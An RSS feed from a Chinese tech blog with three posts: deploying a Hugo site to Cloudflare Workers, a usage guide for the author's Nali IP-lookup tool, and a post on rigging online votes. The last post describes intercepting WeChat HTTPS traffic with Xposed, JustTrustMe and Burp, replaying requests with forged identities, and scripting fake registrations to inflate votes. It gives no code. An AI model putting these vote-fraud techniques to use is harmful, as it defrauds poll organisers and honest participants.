<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>coding - category - zu1k</title><link>https://lgf.im/categories/coding/</link><description>coding - category - zu1k</description><generator>Hugo -- gohugo.io</generator><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Wed, 25 Nov 2020 12:06:25 +0800</lastBuildDate><atom:link href="https://lgf.im/categories/coding/" rel="self" type="application/rss+xml"/><item><title>将博客部署到CF Workers Site</title><link>https://lgf.im/posts/coding/deploy-blog-to-cf-workers-site/</link><pubDate>Wed, 25 Nov 2020 12:06:25 +0800</pubDate><author/><guid>https://lgf.im/posts/coding/deploy-blog-to-cf-workers-site/</guid><description><![CDATA[<p>前几天Cloudflare将Workers KV增加了免费额度，还不得搞起来？</p>
<p>利用Workers KV存储网页内容，通过Workers将内容返回给用户，就等于将自己的网站直接部署到CF成千上万的边缘节点当中，全球访问速度和TTFB都应该不错</p>
<p><a href="https://blog.cloudflare.com/workers-sites/">https://blog.cloudflare.com/workers-sites/</a></p>
<h2 id="安装wrangler">安装Wrangler</h2>
<p><a href="https://developers.cloudflare.com/workers/cli-wrangler/install-update" target="_blank" rel="noopener noreffer">官方文档</a></p>
<p>Wrangler有两种安装方式，通过NPM或者Cargo安装都可以，任选其一即可</p>
<p>准备好NodeJS和NPM环境，然后执行下面命令，NPM方式是下载预编译好的二进制程序，安装速度比较快</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">npm i @cloudflare/wrangler -g
</code></pre></td></tr></table>
</div>
</div><p>或者准备好Rust环境，然后执行下面命令，Cargo方式是在本机从源码编译，安装速度比较慢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">cargo install wrangler

<span class="c1"># 使用系统OpenSSL库，生成的二进制会小一些</span>
cargo install wrangler --features sys-openssl
</code></pre></td></tr></table>
</div>
</div><h2 id="部署">部署</h2>
<p>我自己博客使用的是Hugo，下面所有内容都是按照Hugo的方式来，其他静态站点生成器方法类似</p>
<h3 id="登录">登录</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">wrangler login

<span class="c1"># 手动设置token</span>
wrangler config
</code></pre></td></tr></table>
</div>
</div><h3 id="初始化">初始化</h3>
<p>进入自己站点的目录，执行下面命令进行初始化。这里Wrangler会自动安装cargo-generate工具，在本目录下创建一个<code>workers-site</code>项目目录，然后生成一个<code>wrangler.toml</code>配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">wrangler init --site
</code></pre></td></tr></table>
</div>
</div><p>打开<code>wrangler.toml</code>文件，按照自己的信息进行修改</p>
<p><code>account_id</code>和<code>zone_id</code>都可以从Cloudflare官网上找到，<code>route</code>是路由到Workers的规则，这里写你需要绑定的域名，不要忘记后面的<code>/*</code></p>
<p><code>bucket</code>是网站的目录，因为我用的是Hugo，所有这个目录默认是<code>public</code></p>
<p><code>entry-point</code>是部署到Workers的js代码目录，这里不需要修改，因为刚刚初始化的时候生成的项目目录名已经自动填写上了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-toml" data-lang="toml"><span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;blog&#34;</span>
<span class="nx">type</span> <span class="p">=</span> <span class="s2">&#34;webpack&#34;</span>
<span class="nx">account_id</span> <span class="p">=</span> <span class="s2">&#34;eu5d123456789987456321aabcddgeh&#34;</span>
<span class="nx">workers_dev</span> <span class="p">=</span> <span class="kc">true</span>
<span class="nx">route</span> <span class="p">=</span> <span class="s2">&#34;cf.lgf.im/*&#34;</span>
<span class="nx">zone_id</span> <span class="p">=</span> <span class="s2">&#34;fhidag8u98f43h93fhiohr929c8d59efhauh&#34;</span>

<span class="p">[</span><span class="nx">site</span><span class="p">]</span>
<span class="nx">bucket</span> <span class="p">=</span> <span class="s2">&#34;public&#34;</span>
<span class="nx">entry</span><span class="err">-</span><span class="nx">point</span> <span class="p">=</span> <span class="s2">&#34;workers-site&#34;</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="预览">预览</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">wrangler preview --watch
</code></pre></td></tr></table>
</div>
</div><h3 id="发布">发布</h3>
<p>在Cloudflare中增加一条DNS记录，需要打开CF代理</p>
<p></p>
<p>执行下面命令进行部署</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">wrangler publish
</code></pre></td></tr></table>
</div>
</div><h2 id="使用github-actions持续集成">使用Github Actions持续集成</h2>
<p>Cloudflare提供了官方的<a href="https://github.com/marketplace/actions/deploy-to-cloudflare-workers-with-wrangler" target="_blank" rel="noopener noreffer">Wrangler GitHub Action</a>，可以直接用Github Actions将博客内容部署到CF Workers Site</p>
<h3 id="添加认证信息">添加认证信息</h3>
<p>在github仓库设置一个secret，名字为<code>CF_API_TOKEN</code>，值为Wrangler的token</p>
<p></p>
<h3 id="workflows">Workflows</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml"><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hugo</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="nt">on</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">push</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w">
</span><span class="w">      </span>- <span class="l">master</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="nt">jobs</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">deploy</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu-18.04</span><span class="w">
</span><span class="w">    </span><span class="nt">steps</span><span class="p">:</span><span class="w">
</span><span class="w">      </span>- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/checkout@v2</span><span class="w">
</span><span class="w">        </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">          </span><span class="nt">submodules</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="w">          </span><span class="nt">fetch-depth</span><span class="p">:</span><span class="w"> </span><span class="m">0</span><span class="w">
</span><span class="w">
</span><span class="w">      </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Setup Hugo</span><span class="w">
</span><span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">peaceiris/actions-hugo@v2</span><span class="w">
</span><span class="w">        </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">          </span><span class="nt">hugo-version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.75.1&#39;</span><span class="w">
</span><span class="w">          </span><span class="nt">extended</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="w">
</span><span class="w">      </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Build</span><span class="w">
</span><span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l">hugo --minify</span><span class="w">
</span><span class="w">
</span><span class="w">      </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Deploy</span><span class="w">
</span><span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">peaceiris/actions-gh-pages@v3</span><span class="w">
</span><span class="w">        </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">          </span><span class="nt">github_token</span><span class="p">:</span><span class="w"> </span><span class="l">${{ secrets.GITHUB_TOKEN }}</span><span class="w">
</span><span class="w">          </span><span class="nt">publish_dir</span><span class="p">:</span><span class="w"> </span><span class="l">./public</span><span class="w">
</span><span class="w">
</span><span class="w">      </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Publish</span><span class="w">
</span><span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">cloudflare/wrangler-action@1.3.0</span><span class="w">
</span><span class="w">        </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">          </span><span class="nt">apiToken</span><span class="p">:</span><span class="w"> </span><span class="l">${{ secrets.CF_API_TOKEN }}</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>Nali IP地理信息和CDN服务商查询</title><link>https://lgf.im/posts/coding/nali-golang/</link><pubDate>Fri, 17 Jul 2020 13:39:47 +0000</pubDate><author/><guid>https://lgf.im/posts/coding/nali-golang/</guid><description><![CDATA[<p><a href="https://github.com/zu1k/nali" target="_blank" rel="noopener noreffer">Nali</a></p>
<blockquote>
<p>一个查询IP地理信息和CDN提供商的离线终端工具</p>
</blockquote>
<h2 id="来源">来源</h2>
<p>该工具受 <a href="https://github.com/meteoral/Nali" target="_blank" rel="noopener noreffer">Nali C版本</a> 和 <a href="https://github.com/SukkaW/nali-cli" target="_blank" rel="noopener noreffer">nali-cli js版本</a> 的启发.</p>
<p>我想要在终端对IP地理信息和CDN服务提供商进行查询，发现了Nali这个工具，Nali与哪里谐音，非常适合这类工具</p>
<p>经过简单的使用，我发现最初的C语言版本功能缺失，而苏卡卡大佬的js版本包实在大的恐怖、而支持的平台非常有限，所以我用golang重写了这个工具，在原有功能的基础上增加了对IPv6的支持，并且增加了Geoip2数据库</p>
<h2 id="功能">功能</h2>
<ul>
<li>纯真 IPv4 离线数据库</li>
<li>ZX IPv6 离线数据库</li>
<li>Geoip2 城市数据库 (可选)</li>
<li>IPIP 数据库 (可选)</li>
<li>CDN 服务提供商查询</li>
<li>支持管道处理</li>
<li>支持交互式查询</li>
<li>同时支持IPv4和IPv6</li>
<li>查询完全离线</li>
<li>全平台支持</li>
</ul>
<h2 id="安装">安装</h2>
<h3 id="从源码安装">从源码安装</h3>
<p>Nali 需要预先安装 Go. 安装后可以从源码安装软件:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">$ go get -u -v github.com/zu1k/nali
</code></pre></td></tr></table>
</div>
</div><h3 id="下载预编译的可执行程序">下载预编译的可执行程序</h3>
<p>可以从Release页面下载预编译好的可执行程序: <a href="https://github.com/zu1k/nali/releases" target="_blank" rel="noopener noreffer">Release</a></p>
<p>你需要选择适合你系统和硬件架构的版本下载，解压后可直接运行</p>
<h3 id="使用-docker-版本">使用 Docker 版本</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker pull docker.pkg.github.com//zu1k/nali/nali:latest
</code></pre></td></tr></table>
</div>
</div><h2 id="使用说明">使用说明</h2>
<p><a href="https://asciinema.org/a/RFVaZ3Pwy0Qbr27msFcDYhwcD" target="_blank"></a></p>
<h3 id="查询一个ip的地理信息">查询一个IP的地理信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali 1.2.3.4
1.2.3.4 [澳大利亚 APNIC Debogon-prefix网络]
</code></pre></td></tr></table>
</div>
</div><h4 id="或者-使用-管道">或者 使用 <code>管道</code></h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ echo IP 6.6.6.6 | nali
IP 6.6.6.6 [美国 亚利桑那州华楚卡堡市美国国防部网络中心]
</code></pre></td></tr></table>
</div>
</div><h3 id="同时查询多个ip的地理信息">同时查询多个IP的地理信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali 1.2.3.4 4.3.2.1 123.23.3.0
1.2.3.4 [澳大利亚 APNIC Debogon-prefix网络]
4.3.2.1 [美国 新泽西州纽瓦克市Level3Communications]
123.23.3.0 [越南 越南邮电集团公司]
</code></pre></td></tr></table>
</div>
</div><h3 id="交互式查询">交互式查询</h3>
<p>使用 <code>exit</code> 或  <code>quit</code> 退出查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali
123.23.23.23
123.23.23.23 [越南 越南邮电集团公司]
1.0.0.1
1.0.0.1 [美国 APNIC&amp;CloudFlare公共DNS服务器]
8.8.8.8
8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器]
quit
</code></pre></td></tr></table>
</div>
</div><h3 id="与-dig-命令配合使用">与 <code>dig</code> 命令配合使用</h3>
<p>需要你系统中已经安装好 dig 程序</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ dig nali.lgf.im +short | nali
104.28.2.115 [美国 CloudFlare公司CDN节点]
104.28.3.115 [美国 CloudFlare公司CDN节点]
172.67.135.48 [美国 CloudFlare节点]
</code></pre></td></tr></table>
</div>
</div><h3 id="与-nslookup-命令配合使用">与 <code>nslookup</code> 命令配合使用</h3>
<p>需要你系统中已经安装好 nslookup 程序</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nslookup nali.lgf.im 8.8.8.8 | nali
Server:         8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器]
Address:        8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器]#53

Non-authoritative answer:
Name:   nali.lgf.im
Address: 104.28.3.115 [美国 CloudFlare公司CDN节点]
Name:   nali.lgf.im
Address: 104.28.2.115 [美国 CloudFlare公司CDN节点]
Name:   nali.lgf.im
Address: 172.67.135.48 [美国 CloudFlare节点]
</code></pre></td></tr></table>
</div>
</div><h3 id="与任意程序配合使用">与任意程序配合使用</h3>
<p>因为 nali 支持管道处理，所以可以和任意程序配合使用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">bash abc.sh | nali
</code></pre></td></tr></table>
</div>
</div><p>Nali 将在 IP后面插入IP地理信息，CDN域名后面插入CDN服务提供商信息</p>
<h3 id="支持ipv6">支持IPv6</h3>
<p>和 IPv4 用法完全相同</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nslookup google.com | nali
Server:         127.0.0.53 [局域网 IP]
Address:        127.0.0.53 [局域网 IP]#53

Non-authoritative answer:
Name:   google.com
Address: 216.58.211.110 [美国 Google全球边缘网络]
Name:   google.com
Address: 2a00:1450:400e:809::200e [荷兰Amsterdam Google Inc. 服务器网段]
</code></pre></td></tr></table>
</div>
</div><h3 id="查询-cdn-服务提供商">查询 CDN 服务提供商</h3>
<p>因为 CDN 服务通常使用 CNAME 的域名解析方式，所以推荐与 <code>nslookup</code> 或者 <code>dig</code> 配合使用，在已经知道 CNAME 后可单独使用</p>
<h4 id="只查询-cdn-服务提供商">只查询 CDN 服务提供商</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nslookup www.gov.cn | nali cdn
Server:         127.0.0.53
Address:        127.0.0.53#53

Non-authoritative answer:
www.gov.cn      canonical name = www.gov.cn.bsgslb.cn [白山云 CDN].
www.gov.cn.bsgslb.cn [白山云 CDN]       canonical name = zgovweb.v.bsgslb.cn [白山云 CDN].
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 185.232.56.148
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 185.232.56.147
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 2001:428:6402:21b::6
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 2001:428:6402:21b::5
</code></pre></td></tr></table>
</div>
</div><h4 id="查询所有信息">查询所有信息</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nslookup www.gov.cn | nali
Server:         127.0.0.53 [局域网 IP]
Address:        127.0.0.53 [局域网 IP]#53

Non-authoritative answer:
www.gov.cn      canonical name = www.gov.cn.bsgslb.cn [白山云 CDN].
www.gov.cn.bsgslb.cn [白山云 CDN]       canonical name = zgovweb.v.bsgslb.cn [白山云 CDN].
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 103.104.170.25 [新加坡 ]
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 2001:428:6402:21b::5 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)]
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 2001:428:6402:21b::6 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)]
</code></pre></td></tr></table>
</div>
</div><h4 id="单独使用">单独使用</h4>
<p>需要提前查询到 CNAME 域名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali cdn cdn.somecdncname.com
</code></pre></td></tr></table>
</div>
</div><h2 id="用户交互">用户交互</h2>
<h3 id="查看帮助">查看帮助</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali --help
Usage:
  nali [flags]
  nali [command]

Available Commands:
  cdn         Query cdn service provider
  help        Help about any command
  parse       Query IP information
  update      update chunzhen ip database

Flags:
  -h, --help     help for nali
  -t, --toggle   Help message for toggle

Use &#34;nali [command] --help&#34; for more information about a command.
</code></pre></td></tr></table>
</div>
</div><h3 id="更新纯真数据库">更新纯真数据库</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali update
2020/07/17 12:53:46 正在下载最新纯真 IP 库...
2020/07/17 12:54:05 已将最新的纯真 IP 库保存到本地 /root/.nali/qqwry.dat
</code></pre></td></tr></table>
</div>
</div><h3 id="使用-geoip2-数据库">使用 Geoip2 数据库</h3>
<p>需要设置环境变量： <code>NALI_DB</code></p>
<p>支持的变量内容:</p>
<ul>
<li>Geoip2 <code>['geoip', 'geoip2', 'geo']</code></li>
<li>Chunzhen <code>['chunzhen', 'qqip', 'qqwry']</code></li>
</ul>
<h4 id="windows平台">Windows平台</h4>
<h5 id="使用geoip数据库">使用geoip数据库</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">set NALI_DB=geoip
</code></pre></td></tr></table>
</div>
</div><h5 id="使用ipip数据库">使用ipip数据库</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">set NALI_DB=ipip
</code></pre></td></tr></table>
</div>
</div><h4 id="linux平台">Linux平台</h4>
<h5 id="使用geoip数据库-1">使用geoip数据库</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">export NALI_DB=geoip
</code></pre></td></tr></table>
</div>
</div><h5 id="使用ipip数据库-1">使用ipip数据库</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">export NALI_DB=ipip
</code></pre></td></tr></table>
</div>
</div><h3 id="更换数据库目录">更换数据库目录</h3>
<p>如果未指定数据库存放目录，数据库默认将存放在 <code>~/.nali</code></p>
<p>设置环境变量 <code>NALI_DB_HOME</code> 来指定数据库目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">set NALI_DB_HOME=D:\nalidb

or

export NALI_DB_HOME=/home/nali
</code></pre></td></tr></table>
</div>
</div><h2 id="感谢列表">感谢列表</h2>
<ul>
<li><a href="http://www.cz88.net/fox/ipdat.shtml" target="_blank" rel="noopener noreffer">纯真QQIP离线数据库</a></li>
<li><a href="https://qqwry.mirror.noc.one/" target="_blank" rel="noopener noreffer">qqwry mirror</a></li>
<li><a href="https://github.com/yinheli/qqwry" target="_blank" rel="noopener noreffer">qqwry纯真数据库解析</a></li>
<li><a href="https://ip.zxinc.org/ipquery/" target="_blank" rel="noopener noreffer">ZX公网ipv6数据库</a></li>
<li><a href="https://www.maxmind.com/en/geoip2-precision-city-service" target="_blank" rel="noopener noreffer">Geoip2 city数据库</a></li>
<li><a href="https://github.com/oschwald/geoip2-golang" target="_blank" rel="noopener noreffer">geoip2-golang解析器</a></li>
<li><a href="https://github.com/SukkaLab/cdn" target="_blank" rel="noopener noreffer">CDN provider数据库</a></li>
<li><a href="https://www.ipip.net/product/ip.html" target="_blank" rel="noopener noreffer">IPIP数据库</a></li>
<li><a href="https://github.com/ipipdotnet/ipdb-go" target="_blank" rel="noopener noreffer">IPIP数据库解析</a></li>
<li><a href="https://github.com/spf13/cobra" target="_blank" rel="noopener noreffer">Cobra CLI库</a></li>
<li><a href="https://github.com/SukkaW/nali-cli" target="_blank" rel="noopener noreffer">Nali-cli</a></li>
</ul>
<h2 id="开源证书">开源证书</h2>
<p>MIT</p>
]]></description></item><item><title>关于刷票</title><link>https://lgf.im/posts/security/web-security/brush-votes/</link><pubDate>Mon, 13 Jul 2020 20:06:48 +0000</pubDate><author/><guid>https://lgf.im/posts/security/web-security/brush-votes/</guid><description><![CDATA[<p>相信大家都经历过朋友圈、群组里各种转发求投票的消息，有需求就会有刷票</p>
<p>关于刷票我自己也稍微研究过，这里说的刷票是指刷投票，不是黄牛那种抢票</p>
<h2 id="初识刷票">初识刷票</h2>
<p>人生中第一次刷票是在大一，舍友的姐姐结婚拍婚纱照，摄影店给了一个点赞链接，承诺点赞数量超过500票免费送豪华相册和相框</p>
<p>舍友让我们帮着转发和点赞，这种东西大家都懂，不想污染了朋友圈，但又不能不帮舍友，碰巧当时正在研究微信抓包啥的，便想研究一下看看能不能刷票</p>
<p>投票网页要求必须微信打开，如果是普通浏览器打开不让投票，但是在微信进行投票它也没有弹出那个获取微信个人信息的确认框，这让我怀疑他根本没有利用微信的信息进行身份确认，有可能可以伪造身份进行刷票</p>
<p>早期微信抓包非常简单，手机root后安装xposed，使用JustTrustMe插件信任所有证书，然后手机安装burp的证书，wifi使用burp的代理，然后就能使用burp对https进行抓包了</p>
<p>抓包后发现投票的确没有仔细检查个人信息，于是通过Burp的Intruder伪造了身份，重放几百次顺利给舍友刷取几百票，圆满完成他姐姐交给他的任务</p>
<h2 id="前几天的刷票">前几天的刷票</h2>
<p>前几天出于好奇又刷了一波票，这次经历是我写这篇文章的主要动机</p>
<p>前几天，我们导员、任课老师、教务等疯狂发钉钉、朋友圈、QQ群、QQ空间，让帮我们学弟投票</p>
<p>随手投上一票，发现投票网站需要使用姓名和手机号码注册，但是没有验证手机验证码，并且没有限制浏览器，感觉必有刷票的机会</p>
<p>于是对网页的所有请求进行抓包分析，发现投票是使用WebSocket进行的，投票时只需要给出登录成功的token和要投的队伍号</p>
<p>关键就在这个登录上了，如果能够有效验证投票者身份就能够减轻刷票，但是分析注册和登录请求发现并没有对用户身份进行有效验证，手机号码可以随便伪造</p>
<p>并且，姓名字段没有任何要求，没有限制长度，没有限制必须是中文，随便一个字符串就能被接受</p>
<p>于是写了一个程序，自动伪造身份登录、投票，循环这个过程</p>
<h2 id="认识与建议">认识与建议</h2>
